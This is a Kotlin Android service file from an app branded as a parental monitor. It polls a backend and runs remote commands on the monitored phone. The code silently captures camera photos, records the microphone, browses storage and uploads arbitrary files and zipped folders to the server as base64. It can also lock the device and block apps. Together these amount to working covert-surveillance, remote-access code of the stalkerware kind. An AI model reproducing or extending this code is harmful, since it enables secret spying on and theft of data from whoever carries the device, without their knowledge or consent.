package com.parentalmonitor.child.services

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.CaptureFailure
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Polls the backend for pending remote commands and executes them.
 * Camera capture runs directly on the IO thread via Camera2 (foreground
 * service has FOREGROUND_SERVICE_CAMERA permission declared in manifest).
 */
class RemoteCommandService(private val ctx: Context, private val baseUrl: String) {

    private var mediaRecorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private var recordingStartMs = 0L

    // ── Poll & execute ────────────────────────────────────────────────────────

    suspend fun pollAndExecute(token: String, deviceId: String) = withContext(Dispatchers.IO) {
        try {
            val commands = fetchJson("$baseUrl/api/commands/pending?deviceId=$deviceId", token)
            for (i in 0 until commands.length()) {
                executeCommand(token, commands.getJSONObject(i))
            }
        } catch (_: Exception) {}
    }

    private fun executeCommand(token: String, cmd: JSONObject) {
        val commandId   = cmd.getString("id")
        val commandType = cmd.getString("commandType")
        val payload     = try { JSONObject(cmd.optString("payload", "{}")) } catch (_: Exception) { JSONObject() }

        try {
            val result = when (commandType) {
                "capture_photo"   -> capturePhoto(payload.optString("camera", "back"))
                "list_files"      -> listFiles(payload.optString("path", ""))
                "download_file"   -> downloadFile(payload.optString("path", ""))
                "download_folder" -> downloadFolder(payload.optString("path", ""))
                "start_mic",
                "start_recording" -> startRecording()
                "stop_mic",
                "stop_recording"  -> stopRecordingWithResult()
                "lock_device"     -> { sendLockBroadcast(); """{"type":"status","message":"lock requested"}""" }
                "block_app"       -> {
                    val pkg = payload.optString("packageName", "")
                    if (pkg.isNotBlank()) addBlockedApp(pkg)
                    """{"type":"status","message":"blocked $pkg"}"""
                }
                "unblock_app"     -> {
                    val pkg = payload.optString("packageName", "")
                    if (pkg.isNotBlank()) removeBlockedApp(pkg)
                    """{"type":"status","message":"unblocked $pkg"}"""
                }
                else -> """{"type":"error","message":"unknown command: $commandType"}"""
            }
            reportResult(token, commandId, "completed", result)
        } catch (e: Exception) {
            reportResult(token, commandId, "failed",
                """{"type":"error","message":"${e.message?.replace("\"", "'")}"}""")
        }
    }

    // ── Camera2 capture (runs on IO thread — foreground service has camera type) ─

    @SuppressLint("MissingPermission")
    private fun capturePhoto(facing: String): String {
        if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA)
            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return """{"type":"error","message":"camera permission not granted"}"""
        }

        val manager   = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val wantFront = facing == "front"
        val facingVal = if (wantFront) CameraCharacteristics.LENS_FACING_FRONT
                        else           CameraCharacteristics.LENS_FACING_BACK

        // Find matching camera; fall back to any available
        val cameraId = manager.cameraIdList.firstOrNull { id ->
            manager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == facingVal
        } ?: manager.cameraIdList.firstOrNull()
          ?: return """{"type":"error","message":"no camera available"}"""

        val chars = manager.getCameraCharacteristics(cameraId)
        val map   = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
        // Pick largest JPEG size ≤ 1920px wide for a manageable payload
        val size  = map?.getOutputSizes(ImageFormat.JPEG)
            ?.filter { it.width <= 1920 }
            ?.maxByOrNull { it.width * it.height }
            ?: android.util.Size(1280, 720)

        val latch  = CountDownLatch(1)
        var result = """{"type":"error","message":"timeout — camera did not respond in 20 s"}"""

        val thread  = HandlerThread("CamCapSvc").also { it.start() }
        val handler = Handler(thread.looper)

        val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val buf   = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                val b64   = Base64.encodeToString(bytes, Base64.NO_WRAP)
                result = """{"type":"photo","data":"$b64","mimeType":"image/jpeg","width":${size.width},"height":${size.height}}"""
            } finally {
                img.close()
                latch.countDown()
            }
        }, handler)

        try {
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    try {
                        device.createCaptureSession(
                            listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    try {
                                        val req = device.createCaptureRequest(
                                            CameraDevice.TEMPLATE_STILL_CAPTURE
                                        ).apply {
                                            addTarget(reader.surface)
                                            set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                                            set(CaptureRequest.CONTROL_AE_MODE,
                                                CaptureRequest.CONTROL_AE_MODE_ON)
                                            set(CaptureRequest.CONTROL_AF_MODE,
                                                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                            set(CaptureRequest.CONTROL_AWB_MODE,
                                                CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                        }
                                        session.capture(req.build(),
                                            object : CameraCaptureSession.CaptureCallback() {
                                                override fun onCaptureFailed(
                                                    s: CameraCaptureSession,
                                                    r: CaptureRequest,
                                                    f: CaptureFailure
                                                ) {
                                                    result = """{"type":"error","message":"capture failed reason ${f.reason}"}"""
                                                    latch.countDown()
                                                }
                                            }, handler)
                                    } catch (e: Exception) {
                                        result = """{"type":"error","message":"capture request failed: ${e.message}"}"""
                                        latch.countDown()
                                    }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    result = """{"type":"error","message":"session configure failed"}"""
                                    latch.countDown()
                                }
                            }, handler)
                    } catch (e: Exception) {
                        result = """{"type":"error","message":"createCaptureSession failed: ${e.message}"}"""
                        latch.countDown()
                    }
                }
                override fun onDisconnected(device: CameraDevice) {
                    device.close()
                    result = """{"type":"error","message":"camera disconnected"}"""
                    latch.countDown()
                }
                override fun onError(device: CameraDevice, error: Int) {
                    device.close()
                    result = """{"type":"error","message":"camera error $error"}"""
                    latch.countDown()
                }
            }, handler)

            latch.await(20, TimeUnit.SECONDS)
        } catch (e: Exception) {
            result = """{"type":"error","message":"${e.message?.replace("\"", "'")}"}"""
        } finally {
            try { reader.close() } catch (_: Exception) {}
            thread.quitSafely()
        }

        return result
    }

    // ── Audio recording ───────────────────────────────────────────────────────

    @Suppress("DEPRECATION")
    private fun startRecording(): String {
        stopRecordingWithResult()

        val file = File(ctx.cacheDir, "rec_${System.currentTimeMillis()}.m4a")
        recordingFile    = file
        recordingStartMs = System.currentTimeMillis()

        mediaRecorder = (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            MediaRecorder(ctx) else MediaRecorder()).apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(128_000)
            setOutputFile(file.absolutePath)
            prepare()
            start()
        }
        return """{"type":"status","message":"recording started"}"""
    }

    private fun stopRecordingWithResult(): String {
        val recorder = mediaRecorder
        val file     = recordingFile
        val startMs  = recordingStartMs

        if (recorder == null) return """{"type":"status","message":"not recording"}"""

        try { recorder.stop(); recorder.release() } catch (_: Exception) {}
        mediaRecorder    = null
        recordingFile    = null
        recordingStartMs = 0L

        if (file == null || !file.exists()) {
            return """{"type":"status","message":"recording stopped — no file"}"""
        }

        return try {
            val bytes    = file.readBytes()
            val b64      = Base64.encodeToString(bytes, Base64.NO_WRAP)
            val duration = ((System.currentTimeMillis() - startMs) / 1000).toInt()
            """{"type":"audio","data":"$b64","mimeType":"audio/mp4","duration":$duration}"""
        } catch (e: Exception) {
            """{"type":"error","message":"${e.message}"}"""
        } finally {
            file.delete()
        }
    }

    // ── File listing ──────────────────────────────────────────────────────────

    private fun listFiles(targetPath: String = ""): String {
        val entries = JSONArray()

        val dirsToList: List<java.io.File> = if (targetPath.isNotBlank()) {
            listOf(java.io.File(targetPath))
        } else {
            listOfNotNull(
                Environment.getExternalStorageDirectory(),
                ctx.getExternalFilesDir(null),
            )
        }

        dirsToList.forEach { dir ->
            if (!dir.exists() || !dir.isDirectory) return@forEach
            // Folders first, then files, both sorted by name
            val children = dir.listFiles()
                ?.sortedWith(compareByDescending<java.io.File> { it.isDirectory }.thenBy { it.name.lowercase() })
                ?: return@forEach
            children.forEach { f ->
                entries.put(JSONObject().apply {
                    put("name",     f.name)
                    put("size",     f.length())
                    put("isDir",    f.isDirectory)
                    put("modified", f.lastModified())
                    put("path",     f.absolutePath)
                    // Parent path so the UI can build breadcrumbs
                    put("parentPath", f.parent ?: "")
                })
            }
        }

        val displayPath = if (targetPath.isBlank())
            Environment.getExternalStorageDirectory().absolutePath
        else targetPath

        return JSONObject().apply {
            put("type",    "files")
            put("path",    displayPath)
            put("entries", entries)
        }.toString()
    }

    // ── File download ─────────────────────────────────────────────────────────

    private fun downloadFile(path: String): String {
        if (path.isBlank()) return """{"type":"error","message":"path required"}"""
        val file = java.io.File(path)
        if (!file.exists())  return """{"type":"error","message":"file not found: $path"}"""
        if (!file.isFile)    return """{"type":"error","message":"path is a directory — use download_folder"}"""

        val maxBytes = 15L * 1024 * 1024        // 15 MB hard limit
        if (file.length() > maxBytes)
            return """{"type":"error","message":"file too large (${file.length() / 1024 / 1024} MB). Max is 15 MB."}"""

        return try {
            val bytes = file.readBytes()
            val b64   = Base64.encodeToString(bytes, Base64.NO_WRAP)
            // Use JSONObject so filename special chars are properly escaped
            JSONObject().apply {
                put("type",     "file")
                put("data",     b64)
                put("mimeType", guessMime(file.name))
                put("name",     file.name)
                put("size",     file.length())
            }.toString()
        } catch (e: Exception) {
            JSONObject().apply {
                put("type",    "error")
                put("message", "read failed: ${e.message}")
            }.toString()
        }
    }

    private fun downloadFolder(path: String): String {
        if (path.isBlank()) return """{"type":"error","message":"path required"}"""
        val dir = java.io.File(path)
        if (!dir.exists() || !dir.isDirectory)
            return """{"type":"error","message":"directory not found: $path"}"""

        // Collect files recursively up to depth 2, skip very large files
        val maxSingleFile = 10L * 1024 * 1024   // skip files > 10 MB each
        val maxTotal      = 30L * 1024 * 1024   // 30 MB total zip limit
        val toZip = mutableListOf<Pair<java.io.File, String>>() // file → entry name

        fun collect(f: java.io.File, prefix: String, depth: Int) {
            if (depth > 2) return
            if (f.isDirectory) {
                f.listFiles()?.forEach { child -> collect(child, "$prefix${f.name}/", depth + 1) }
            } else if (f.isFile && f.length() <= maxSingleFile) {
                toZip.add(Pair(f, "$prefix${f.name}"))
            }
        }
        dir.listFiles()?.forEach { child -> collect(child, "", 0) }

        val totalSize = toZip.sumOf { it.first.length() }
        if (totalSize > maxTotal)
            return """{"type":"error","message":"folder too large (${totalSize / 1024 / 1024} MB). Max is 30 MB."}"""

        if (toZip.isEmpty())
            return """{"type":"error","message":"folder is empty or contains no downloadable files"}"""

        val zipFile = java.io.File(ctx.cacheDir, "folder_${System.currentTimeMillis()}.zip")
        return try {
            java.util.zip.ZipOutputStream(
                java.io.BufferedOutputStream(java.io.FileOutputStream(zipFile))
            ).use { zos ->
                toZip.forEach { (f, entryName) ->
                    try {
                        zos.putNextEntry(java.util.zip.ZipEntry(entryName))
                        f.inputStream().use { it.copyTo(zos) }
                        zos.closeEntry()
                    } catch (_: Exception) {}
                }
            }
            val bytes = zipFile.readBytes()
            val b64   = Base64.encodeToString(bytes, Base64.NO_WRAP)
            JSONObject().apply {
                put("type",     "file")
                put("data",     b64)
                put("mimeType", "application/zip")
                put("name",     "${dir.name}.zip")
                put("size",     zipFile.length())
            }.toString()
        } catch (e: Exception) {
            JSONObject().apply {
                put("type",    "error")
                put("message", "zip failed: ${e.message}")
            }.toString()
        } finally {
            zipFile.delete()
        }
    }

    private fun guessMime(name: String): String = when {
        name.endsWith(".jpg",  true) || name.endsWith(".jpeg", true) -> "image/jpeg"
        name.endsWith(".png",  true) -> "image/png"
        name.endsWith(".webp", true) -> "image/webp"
        name.endsWith(".gif",  true) -> "image/gif"
        name.endsWith(".mp4",  true) -> "video/mp4"
        name.endsWith(".3gp",  true) -> "video/3gpp"
        name.endsWith(".mp3",  true) -> "audio/mpeg"
        name.endsWith(".aac",  true) -> "audio/aac"
        name.endsWith(".pdf",  true) -> "application/pdf"
        name.endsWith(".zip",  true) -> "application/zip"
        name.endsWith(".txt",  true) -> "text/plain"
        name.endsWith(".json", true) -> "application/json"
        name.endsWith(".doc",  true) || name.endsWith(".docx", true) -> "application/msword"
        name.endsWith(".xls",  true) || name.endsWith(".xlsx", true) -> "application/vnd.ms-excel"
        name.endsWith(".apk",  true) -> "application/vnd.android.package-archive"
        else -> "application/octet-stream"
    }

    // ── Lock device ───────────────────────────────────────────────────────────

    private fun sendLockBroadcast() {
        ctx.sendBroadcast(android.content.Intent("com.parentalmonitor.LOCK_SCREEN"))
    }

    // ── Geofences ─────────────────────────────────────────────────────────────

    suspend fun syncGeofences(token: String, deviceId: String) = withContext(Dispatchers.IO) {
        try {
            val zones = fetchJson("$baseUrl/api/commands/geofences?deviceId=$deviceId", token)
            ctx.getSharedPreferences(PREFS_COMMANDS, Context.MODE_PRIVATE)
                .edit().putString(KEY_GEOFENCES, zones.toString()).apply()
        } catch (_: Exception) {}
    }

    fun getStoredGeofences(): JSONArray {
        val raw = ctx.getSharedPreferences(PREFS_COMMANDS, Context.MODE_PRIVATE)
            .getString(KEY_GEOFENCES, "[]") ?: "[]"
        return try { JSONArray(raw) } catch (_: Exception) { JSONArray() }
    }

    // ── App block rules ───────────────────────────────────────────────────────

    suspend fun syncAppBlocks(token: String, deviceId: String) = withContext(Dispatchers.IO) {
        try {
            val rules   = fetchJson("$baseUrl/api/commands/app-blocks?deviceId=$deviceId", token)
            val blocked = JSONArray()
            for (i in 0 until rules.length()) {
                val rule = rules.getJSONObject(i)
                if (rule.optBoolean("isBlocked", false)) blocked.put(rule.optString("packageName"))
            }
            ctx.getSharedPreferences(PREFS_COMMANDS, Context.MODE_PRIVATE)
                .edit().putString(KEY_BLOCKED_APPS, blocked.toString()).apply()
        } catch (_: Exception) {}
    }

    private fun addBlockedApp(pkg: String) {
        val prefs    = ctx.getSharedPreferences(PREFS_COMMANDS, Context.MODE_PRIVATE)
        val existing = try { JSONArray(prefs.getString(KEY_BLOCKED_APPS, "[]") ?: "[]") } catch (_: Exception) { JSONArray() }
        for (i in 0 until existing.length()) if (existing.getString(i) == pkg) return
        existing.put(pkg)
        prefs.edit().putString(KEY_BLOCKED_APPS, existing.toString()).apply()
    }

    private fun removeBlockedApp(pkg: String) {
        val prefs    = ctx.getSharedPreferences(PREFS_COMMANDS, Context.MODE_PRIVATE)
        val existing = try { JSONArray(prefs.getString(KEY_BLOCKED_APPS, "[]") ?: "[]") } catch (_: Exception) { JSONArray() }
        val updated  = JSONArray()
        for (i in 0 until existing.length()) if (existing.getString(i) != pkg) updated.put(existing.getString(i))
        prefs.edit().putString(KEY_BLOCKED_APPS, updated.toString()).apply()
    }

    // ── Report result back to backend ─────────────────────────────────────────

    private fun reportResult(token: String, commandId: String, status: String, resultJson: String) {
        try {
            val body = """{"status":"$status","result":${escapeForJson(resultJson)}}"""
                .toByteArray(Charsets.UTF_8)
            val conn = (URL("$baseUrl/api/commands/$commandId/status")
                .openConnection() as HttpURLConnection).apply {
                requestMethod = "PATCH"
                setRequestProperty("Authorization",  "Bearer $token")
                setRequestProperty("Content-Type",   "application/json")
                doOutput       = true
                connectTimeout = 15_000
                readTimeout    = 180_000   // large files can take time to upload
                setFixedLengthStreamingMode(body.size.toLong())
            }
            conn.outputStream.use { it.write(body) }
            val code = conn.responseCode
            if (code != 200 && code != 201) {
                android.util.Log.w(TAG, "reportResult HTTP $code for $commandId (${body.size} bytes)")
                try { android.util.Log.w(TAG, conn.errorStream?.bufferedReader()?.readText() ?: "") } catch (_: Exception) {}
            } else {
                android.util.Log.d(TAG, "reportResult $status for $commandId ✓ (${body.size} bytes)")
            }
            conn.disconnect()
        } catch (e: Exception) {
            android.util.Log.w(TAG, "reportResult exception for $commandId: ${e.message}")
        }
    }

    // Wraps the result as a JSON string so Zod z.string() validation passes
    private fun escapeForJson(raw: String): String =
        "\"${raw.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")}\""

    // ── HTTP helper ───────────────────────────────────────────────────────────

    private fun fetchJson(urlStr: String, token: String): JSONArray {
        val conn = (URL(urlStr).openConnection() as HttpURLConnection).apply {
            setRequestProperty("Authorization", "Bearer $token")
            requestMethod  = "GET"
            connectTimeout = 10_000
            readTimeout    = 10_000
        }
        val code = conn.responseCode
        if (code != 200) return JSONArray()
        val body = conn.inputStream.bufferedReader().readText()
        conn.disconnect()
        return JSONArray(body)
    }

    companion object {
        private const val TAG          = "RemoteCommandService"
        const val PREFS_COMMANDS       = "pm_commands"
        const val KEY_GEOFENCES        = "geofence_zones"
        const val KEY_BLOCKED_APPS     = "blocked_apps"
    }
}
